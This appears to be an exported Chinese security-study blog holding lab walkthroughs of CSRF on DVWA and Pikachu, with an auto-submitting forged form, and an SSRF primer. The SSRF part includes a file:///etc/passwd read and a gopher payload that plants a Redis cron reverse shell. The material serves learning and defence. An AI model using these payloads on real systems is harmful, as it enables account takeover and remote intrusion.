<h5 id="漏洞利用条件"><a href="#漏洞利用条件" class="headerlink" title="漏洞利用条件"></a>漏洞利用条件</h5><p>1.攻击者必须在目标站点找到一个表单的提交入口，或者有类似的URL(例如用来转钱，修改受害者邮箱或者密码)</p>
<p>2.目标站点不能有检测referer头操作，或者被攻击者的浏览器允许referer欺骗</p>
<p>3.攻击者必须了解表单或者URL参数中的正确的值，如果有秘密验证值或者ID，攻击者没有猜对，攻击者很可能不成功。</p>
<p>4。攻击者必须诱使受害者访问有恶意代码的页面，并且此时受害者已经登录到目标站点。</p>
<h5 id="漏洞利用场景"><a href="#漏洞利用场景" class="headerlink" title="漏洞利用场景"></a>漏洞利用场景</h5><ul>
<li>有意义的操作（如修改密码）</li>
<li>验证过于简单（参数固定、我们可以设置参数）</li>
</ul>
<p><strong>漏洞类型</strong></p>
<ul>
<li>GET型</li>
<li>POST型</li>
</ul>
<h5 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h5><p>1.手工检测：抓包查看是否存在无token无referer验证这种情况。存在的话就会有CSRF漏洞</p>
<p>​                       如果存在无token有referer验证这种情况时，我们可以尝试空referer绕过或者尝试抓包伪造referer  </p>
<p>2.半自动检测：常用半自动检测漏洞的软件有CSRFTester,CSRF Request Builder等。</p>
<h5 id="漏洞挖掘："><a href="#漏洞挖掘：" class="headerlink" title="漏洞挖掘："></a>漏洞挖掘：</h5><p><strong>1、自动化扫描工具</strong></p>
<p>netspark</p>
<p>AWVS</p>
<p>appscan</p>
<p>一般用上列工具可以扫描到网站是否存在CSRF漏洞。但是在工具中添加登录参数可以大大提高挖掘的成功率</p>
<p><strong>2、半自动检测工具</strong></p>
<p>CSRFTester</p>
<p>下载地址：<a href="https://www.owasp.org/index.php/File:CSRFTester-1.0.zip" target="_blank" rel="noopener">https://www.owasp.org/index.php/File:CSRFTester-1.0.zip</a></p>
<p>1.安装CSRFTester</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200123184231.png" alt="1.jpg"></p>
<p>打开run.bat就可以打开工具，但是需要java的环境</p>
<p><img src="2-1024x622.jpg" alt="2.jpg">)<img src="21-1024x622.jpg" alt="2.jpg"></p>
<p>消息框出现该消息时，表示工具已经开始监听本地8008这个端口了，这个时候需要配置浏览器的代理</p>
<p>\2. 设置浏览器代理（搜狗浏览器为例）</p>
<p>点击工具栏–代理设置–添加新代理，将代理进行添加并启用即可</p>
<p><img src="3-1024x584.png" alt="3.png"></p>
<p>\3. 用户登录</p>
<p>单击“Start Recording”，开启CSRFTester的检测工作，这样以后我们所有访问的URL以及参数都会被记录下来。</p>
<p>\4. 通过CSRFTester抓取和伪造请求</p>
<p>当你登录一个网站账号时，CSRF Tester会进行抓取</p>
<p><img src="9.png" alt="9.png"></p>
<p>我们抓取了该请求，在Step属性中添加请求，然后将Form Parameter中的user等表单中参数进行修改，然后单击Generate HTML按钮（可以选择其他格式：Forms、IFrame等）来产生CSRF攻击脚本。</p>
<p><img src="10-1024x659.png" alt="10.png"></p>
<p>随机生成了一个攻击脚本，将其上传服务器，发送给受害者即可。</p>
<p>CSRF PoC generator</p>
<p>打开burpsuite，在抓取任意一个HTTP请求中点击右键，选择Engagement tools，然后点击Generate CSRF POC即可生成CSRF POC，</p>
<p><img src="8-1024x822.png" alt="8.png">)<img src="https://www.secpulse.com/wp-content/themes/secpulse2017/js/editor/themes/default/images/spacer.gif" alt="img"></p>
<p>这款工具也是根据请求参数生成的POC，可以直接点击test in browser按钮进行测试，点击后会利用这段POC进行攻击。</p>
<p>上列两款工具可以拦截所有的请求，渗透测试人员可以在登录状态下进行修改密码、删除文件等操作，工具便会将发送的请求进行拦截，再通过工具生成的POC便可以验证漏洞是否存在。</p>
<p>1.CSRFTester设置浏览器代理:127.0.0.1:8008，bp是8080</p>
<p>2.登录web应用程序，提交表单，在CSRF工具中修改表单内容，查看是否更改，如果更改就存在CSRF漏洞</p>
<p>3.生成POC<br>一个wordpress博客为例就存在一个CSRF漏洞<br>创建用户，bp抓包，修改添加用户的账号密码<br>[<img src="20190802112041-81ebadd4-b4d4-1.png" alt="img">]<br>发送到CSRF POC<br>[<img src="20190802112102-8e91ff5c-b4d4-1.png" alt="img">]<br>以html形式保存下来，发送给目标用户欺骗他打开，成功创建一个新账户<br>[<img src="20190802112122-9a57c2f4-b4d4-1.png" alt="img">]</p>
<h5 id="常见的防御方法："><a href="#常见的防御方法：" class="headerlink" title="常见的防御方法："></a>常见的防御方法：</h5><ul>
<li><p><strong>使用验证码：</strong></p>
<p>验证码强制用户必须和应用进行交互，才能完成最终的请求</p>
</li>
<li><p><strong>验证HTTP referer字段：</strong></p>
<p>HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，会带上Referer，通过验证Referer，可以判断请求的合法性，如果Referer是其他网站的话，就有可能是CSRF攻击，则拒绝该请求。</p>
</li>
<li><p><strong>在请求地址中添加token并验证：</strong></p>
<p>在HTTP请求中以参数的形式加入一个随机产生的token，并在服务器端建立一个拦截器来验证这个token，如果请求中没有token或者token不正确，则认为可能是CSRF攻击而拒绝该请求。</p>
</li>
</ul>
<h4 id="DVWA（CSRF部分）"><a href="#DVWA（CSRF部分）" class="headerlink" title="DVWA（CSRF部分）"></a>DVWA（CSRF部分）</h4><h5 id="simple"><a href="#simple" class="headerlink" title="simple:"></a>simple:</h5><img src="QQ截图20200123184231.png" style="zoom:50%;" />

<p><strong>分析：</strong></p>
<p>​      我们分析源代码可知，服务器收到修改密码的请求后，会检查参数password_new password_conf是否相同，如果相同，就会修改密码，并没有任何的防CSRF机制，所以我们只需要用户在cookie还有效的时间内在相同的浏览器访问我们给定的url（该操作是服务器对请求的发送者进行了身份验证，检查cookie），就可以实现CSRF攻击，修改用户密码。</p>
<p><strong>漏洞利用</strong></p>
<p>我们可以构造如下URL进行修改密码：</p>
<p><a href="http://localhost/DVWA/vulnerabilities/csrf/?password_new=admin&amp;password_conf=admin&amp;Change=Change#" target="_blank" rel="noopener">http://localhost/DVWA/vulnerabilities/csrf/?password_new=admin&amp;password_conf=admin&amp;Change=Change#</a></p>
<p>我们构造一个html表单提交页面</p>
<img src="QQ截图20200128112112.png" style="zoom:67%;" />

<p>将html文件放入本地网站的根目录下。</p>
<p>我们尝试在本地访问该网页</p>
<img src="QQ截图20200128112036.png" style="zoom:50%;" />



<p>点击后发现跳转到了DVWA更改密码界面，密码被修改</p>
<img src="QQ截图20200128112051.png" style="zoom:67%;" />



<h5 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h5><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>

<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">isset</span><span class="token punctuation">(</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string">'Change'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">// Checks to see where the request came from</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">stripos</span><span class="token punctuation">(</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span> <span class="token string">'HTTP_REFERER'</span> <span class="token punctuation">]</span> <span class="token punctuation">,</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span> <span class="token string">'SERVER_NAME'</span> <span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token boolean">false</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment" spellcheck="true">// Get input</span>
        <span class="token variable">$pass_new</span>  <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string">'password_new'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$pass_conf</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string">'password_conf'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>

        <span class="token comment" spellcheck="true">// Do the passwords match?</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$pass_new</span> <span class="token operator">==</span> <span class="token variable">$pass_conf</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment" spellcheck="true">// They do!</span>
            <span class="token variable">$pass_new</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$pass_new</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">trigger_error</span><span class="token punctuation">(</span><span class="token string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span><span class="token punctuation">,</span> <span class="token constant">E_USER_ERROR</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string">""</span> <span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$pass_new</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span> <span class="token variable">$pass_new</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token comment" spellcheck="true">// Update the database</span>
            <span class="token variable">$insert</span> <span class="token operator">=</span> <span class="token string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> <span class="token punctuation">.</span> <span class="token function">dvwaCurrentUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"';"</span><span class="token punctuation">;</span>
            <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$insert</span> <span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span> <span class="token string">'&lt;pre>'</span> <span class="token punctuation">.</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$___mysqli_res</span> <span class="token operator">=</span> <span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$___mysqli_res</span> <span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'&lt;/pre>'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token comment" spellcheck="true">// Feedback for the user</span>
            <span class="token keyword">echo</span> <span class="token string">"&lt;pre>Password Changed.&lt;/pre>"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token comment" spellcheck="true">// Issue with passwords matching</span>
            <span class="token keyword">echo</span> <span class="token string">"&lt;pre>Passwords did not match.&lt;/pre>"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token comment" spellcheck="true">// Didn't come from a trusted source</span>
        <span class="token keyword">echo</span> <span class="token string">"&lt;pre>That request didn't look correct.&lt;/pre>"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">is_null</span><span class="token punctuation">(</span><span class="token variable">$___mysqli_res</span> <span class="token operator">=</span> <span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token boolean">false</span> <span class="token punctuation">:</span> <span class="token variable">$___mysqli_res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token delimiter">?></span> </code></pre>
<p><strong>分析：</strong></p>
<p>Medium级别的代码检查了保留变量 HTTP_REFERER（http包头的Referer参数的值，表示来源地址）中是否包含SERVER_NAME（http包头的Host参数，及要访问的主机名，这里是192.168.153.130），希望通过这种机制抵御CSRF攻击</p>
<p><strong>漏洞利用：</strong></p>
<p>我们用burp对数据进行抓包，不断对referer进行修改，最后发现referer需包含我们host名</p>
<img src="QQ截图20200128112923.png" style="zoom: 67%;" />





<p>查阅资料了解到referer参数和链接相同，我们可以将Html文件名中包含127.0.0.1,比如将html文件修改为</p>
<p>127.0.0.1.html</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200128113629.png" alt=""></p>
<p>我们在浏览器打开127.0.0.1.html，点击submit</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200128113414.png" alt=""></p>
<p>我们发现密码成功修改。</p>
<p><strong>high</strong></p>
<p>high等级我们发现在url中多了user_token,并且每次修改密码user_token都随着变化</p>
<p>usr_token的职责：它的职责是保护用户的用户名及密码多次提交，以防密码泄露。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200128114230.png" alt=""></p>
<p>如果该页面不存在XSS漏洞时，此方法就可以有效杜绝CSRF漏洞</p>
<p>但我们可以通过利用DVWA的XSS漏洞进行有效利用</p>
<p><strong>利用过程</strong></p>
<p>我们首先利用dvwa的XSS漏洞获取浏览器cookie.</p>
<img src="QQ截图20200128114910.png" style="zoom:50%;" />

<p>然后我们回到构造好的CSRF页面提交用Burp进行抓包</p>
<img src="QQ截图20200128115317.png" style="zoom:67%;" />

<p>我们使用获取到的cookie进行替换，然后发包即可成功修改密码。</p>
<p><strong>impossibe</strong></p>
<img src="QQ截图20200128120628.png" style="zoom:50%;" />

<p>它提示了要输入原始密码，这就保证了当前用户一定是本人，有效的确保了CSRF攻击。</p>
<h4 id="Pikachu平台-CSRF部分）"><a href="#Pikachu平台-CSRF部分）" class="headerlink" title="Pikachu平台(CSRF部分）"></a>Pikachu平台(CSRF部分）</h4><p><img src="QQ%E6%88%AA%E5%9B%BE20200129173327.png" alt=""></p>
<h5 id="CSRF-GET"><a href="#CSRF-GET" class="headerlink" title="CSRF(GET)"></a>CSRF(GET)</h5><p>我们首先根据右上角的提示登录账号</p>
<img src="QQ截图20200129173354.png" style="zoom:50%;" />





<img src="QQ截图20200129173746.png" style="zoom:67%;" />



<p>我们选择修改个人信息并用burp抓包</p>
<img src="QQ截图20200129173928.png" style="zoom:80%;" />

<p>提交的请求来看，后台没做CSRF token，同时也是通过GET请求来提交修改信息，我们拿到这个请求，伪造一个请求链接，然后让kobe点击就好，我们构造的URL中把地址add改为hack。kobe一点击就修改了地址。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200129174206.png" alt=""></p>
<h5 id="CSRF-POST"><a href="#CSRF-POST" class="headerlink" title="CSRF(POST)"></a>CSRF(POST)</h5><p>POST型，所有参数在请求体中提交，我们不能通过伪造URL的方式进行攻击。</p>
<p>这里的攻击方式跟XSS中POST类型是一样的，攻击者可以搭建一个站点，在站点上做一个表单，诱导lucy点击这个链接，当用户点击时，就会自动向存在CSRF的服务器提交POST请求修改个人信息。</p>
<p>我们编写一个自动提交表单的html文件：</p>
<pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">
window<span class="token punctuation">.</span>onload <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"postsubmit"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://192.168.171.133/pikachu/vul/csrf/csrfpost/csrf_post_edit.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>sex<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>sex<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>girl<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>phonenum<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>phonenum<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>12345678922<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>add<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>add<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hacker<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>lucy@pikachu.com<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>postsubmit<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre>
<p>​      下面把页面的URL发送给受害者，只要受害者一点击这个链接，就会自动往服务器发送POST请求，修改地址信息。</p>
<h5 id="CSRF（token"><a href="#CSRF（token" class="headerlink" title="CSRF（token)"></a>CSRF（token)</h5><p> CSRF的主要问题是敏感操作容易被伪造，我们可以加入Token让请求不容易被伪造</p>
<ul>
<li><p>每次请求，都增加一个随机码(需要够随机，不容易被伪造），后台每次对这个随机码进行验证</p>
<p>我们进入Pikachu平台的CSRF（token）页面并登录，我们可以看一下这个GET请求</p>
</li>
</ul>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200203172940.png" alt=""></p>
<p>跟前面比较，这里多了一个Token，如果后台对提交的Token进行了验证，由于Token是随机的，我们就无法伪造URL了</p>
<h5 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h5><p><a href="https://xz.aliyun.com/t/7297" target="_blank" rel="noopener">https://xz.aliyun.com/t/7297</a></p>
<p><a href="https://xz.aliyun.com/t/240" target="_blank" rel="noopener">https://xz.aliyun.com/t/240</a></p>
<p><a href="https://cloud.tencent.com/developer/article/1472698" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1472698</a></p>
<p><a href="https://blog.csdn.net/SKI_12/article/details/60477557" target="_blank" rel="noopener">https://blog.csdn.net/SKI_12/article/details/60477557</a></p>
]]></content>
      <categories>
        <category>web漏洞学习</category>
      </categories>
      <tags>
        <tag>CSRF学习</tag>
      </tags>
  </entry>
  <entry>
    <title>我的SSRF漏洞学习</title>
    <url>/2020/04/20/ssrf-lou-dong-xue-xi/</url>
    <content><![CDATA[<h3 id="SSRF漏洞部分"><a href="#SSRF漏洞部分" class="headerlink" title="SSRF漏洞部分"></a>SSRF漏洞部分</h3><h4 id="SSRF简述"><a href="#SSRF简述" class="headerlink" title="SSRF简述"></a>SSRF简述</h4><p><img src="20181227082125119.png" alt=""></p>
<p>​       SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p>
<h5 id="漏洞形成原因"><a href="#漏洞形成原因" class="headerlink" title="漏洞形成原因"></a>漏洞形成原因</h5><p>SSRF形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。</p>
<p>例如：</p>
<p><code>www.xxx.com/a.php?image=http://www.abc.com/1.jpg</code></p>
<p>如果我们将<a href="http://www.abc.com/1.jpg换为与该服务器相连的内网服务器地址会产生什么效果呢？" target="_blank" rel="noopener">http://www.abc.com/1.jpg换为与该服务器相连的内网服务器地址会产生什么效果呢？</a></p>
<p>如果存在该内网地址就会返回1xx 2xx 之类的状态码，不存在就会其他的状态码</p>
<p>SSRF漏洞就是通过篡改获取资源的请求发送给服务器，但是服务器并没有发现这个请求是否合法，然后服务器以他的身份来访问其他服务器的资源。</p>
<p><strong>curl造成的SSRF</strong></p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">function</span> <span class="token function">curl</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$ch</span><span class="token operator">=</span><span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span><span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span><span class="token variable">$URL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span><span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token function">curl</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span></code></pre>
<p><strong>file_get_contents造成的SSRF</strong></p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
    <span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span></code></pre>
<h5 id="SSRF常见出现位置"><a href="#SSRF常见出现位置" class="headerlink" title="SSRF常见出现位置"></a>SSRF常见出现位置</h5><ul>
<li>分享：通过URL地址分享网页内容</li>
<li>转码服务</li>
<li>在线翻译</li>
<li>图片加载与下载：通过URL地址加载或下载图片</li>
<li>图片、文章收藏功能</li>
<li>未公开API实现以及其他调用URL的功能</li>
</ul>
<h5 id="SSRF验证方法"><a href="#SSRF验证方法" class="headerlink" title="SSRF验证方法"></a>SSRF验证方法</h5><p>1.因为SSRF漏洞是构造服务器发送请求的安全漏洞，所以我们就可以通过抓包分析发送的请求是否是由服务器的发送的来判断是否存在SSRF漏洞</p>
<p>2.在页面源码中查找访问的资源地址 ，如果该资源地址类型为 <a href="http://www.xxx.com/a.php?image=（地址）的就可能存在SSRF漏洞" target="_blank" rel="noopener">http://www.xxx.com/a.php?image=（地址）的就可能存在SSRF漏洞</a></p>
<h5 id="利用SSRF漏洞"><a href="#利用SSRF漏洞" class="headerlink" title="利用SSRF漏洞"></a>利用SSRF漏洞</h5><ol>
<li>让服务器去访问相应的网址</li>
<li>让服务器去访问自己所处内网的一些指纹文件来判断是否存在相应的CMS</li>
<li>可以使用file、dict、gopher、ftp协议进行请求访问相应的文件</li>
<li>攻击运行在内网或本地的应用程序（比如溢出）;</li>
<li>可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;</li>
</ol>
<p>SSRF中各个编程语言可以使用的协议如下图所示：</p>
<p><img src="12.png" alt=""></p>
<ul>
<li><p>file协议</p>
<p>​    查看文件：file:///etc/passwd</p>
</li>
<li><p>dict协议</p>
<p>​    探测端口：dict://127.0.0.1:80</p>
</li>
<li><p>gopher协议</p>
<p>​    Gopher协议可以做很多，特别是在SSRF漏洞中可以发挥很多重要的作用，利用此协议可以攻击内网的FTP、Telnet Redis Memcache 也可以进行GET POST请求 .</p>
<pre><code>curl -v &#39;http://sec.com:8082/sec/ssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_%2A3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2456%250d%250a%250d%250a%250a%250a%2A%2F1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F127.0.0.1%2F2333%200%3E%261%250a%250a%250a%250d%250a%250d%250a%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2Fvar%2Fspool%2Fcron%2F%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2A1%250d%250a%244%250d%250asave%250d%250a%2A1%250d%250a%244%250d%250aquit%250d%250a&#39;</code></pre></li>
</ul>
<ol>
<li>攻击内网web应用（可以向内部任意主机的任意端口发送精心构造的数据包）</li>
<li>攻击内网应用程序（利用跨协议通信技术）</li>
<li>DOS攻击</li>
<li>判断内网主机是否存活：访问是否有端口开放</li>
</ol>
